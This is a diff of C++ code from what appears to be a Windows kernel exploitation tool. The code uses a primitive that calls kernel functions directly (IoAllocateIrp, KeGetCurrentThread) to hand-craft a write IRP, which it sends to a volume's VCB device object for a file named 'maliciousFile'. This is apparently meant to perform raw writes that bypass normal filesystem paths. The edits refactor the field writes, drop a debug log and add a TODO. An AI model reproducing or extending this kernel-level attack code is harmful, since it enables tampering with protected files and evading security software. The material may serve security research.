@@ -90,9 +90,8 @@ bool RunTestUsermodeIo( std::vector<BYTE>& Signature )
     return TRUE;
 }
 
-_DEVICE_OBJECT* GetVcbDeviceObject( const KernelPtr<FILE_OBJECT>& FileObject )
+_DEVICE_OBJECT* GetVcbDeviceObject( KernelPtr<FILE_OBJECT>& FileObject )
 {
-    LOG_DEBUG( "Got here" );
     // get VPB (volume parameter block)
     KernelPtr<VPB> vpb = FileObject->Vpb;
     return vpb->DeviceObject;
@@ -107,6 +106,8 @@ KernelPtr<IRP> CraftWriteIrp(
 {
     constexpr CCHAR StackSize = 10;
 
+    // TODO: KernelPtr writes fail hard
+
     KernelPtr<IRP> irp = (PIRP)g_Invoker->CallKernelFunction( "IoAllocateIrp", StackSize, false );
     irp->UserIosb = &Iosb;
 
@@ -116,16 +117,20 @@ KernelPtr<IRP> CraftWriteIrp(
     //
     irp->UserBuffer = InputBuffer;
 
-    irp->Tail.Overlay.OriginalFileObject = (PVOID)FileObject;
-    irp->Tail.Overlay.Thread = (PVOID)(PVOID)g_Invoker->CallKernelFunction( "KeGetCurrentThread" );
+    auto tail = irp->Tail;
+    tail.Overlay.OriginalFileObject = (PVOID)FileObject;
+    tail.Overlay.Thread = (PVOID)(PVOID)g_Invoker->CallKernelFunction( "KeGetCurrentThread" );
+    irp->Tail = tail;
 
-    KernelPtr<IO_STACK_LOCATION> stackLocation = irp->Tail.Overlay.CurrentStackLocation;
+    KernelPtr<IO_STACK_LOCATION> stackLocation = tail.Overlay.CurrentStackLocation;
     stackLocation->MajorFunction = IRP_MJ_WRITE;
     stackLocation->DeviceObject = DeviceObject;
     stackLocation->FileObject = FileObject;
 
-    stackLocation->Parameters.Write.ByteOffset.QuadPart = 0;
-    stackLocation->Parameters.Write.Length = InputSize;
+    auto writeParameters = stackLocation->Parameters;
+    writeParameters.Write.ByteOffset.QuadPart = 0;
+    writeParameters.Write.Length = InputSize;
+    stackLocation->Parameters = writeParameters;
 
     return irp;
 }
@@ -187,7 +192,8 @@ bool RunTestKernelIo( std::vector<BYTE>& Signature )
     //
 
     // The IRP should be sent into the VCB's device object.
-    _DEVICE_OBJECT* vcbDeviceObject = GetVcbDeviceObject( KernelPtr<FILE_OBJECT>(maliciousFile) );
+    KernelPtr<FILE_OBJECT> fileObject = maliciousFile;
+    _DEVICE_OBJECT* vcbDeviceObject = GetVcbDeviceObject( fileObject );
     std::cout << "[*] VCB Device object: 0x" << std::hex << kAddress( vcbDeviceObject ) << std::endl;
 
     IO_STATUS_BLOCK iosb = { 0 };
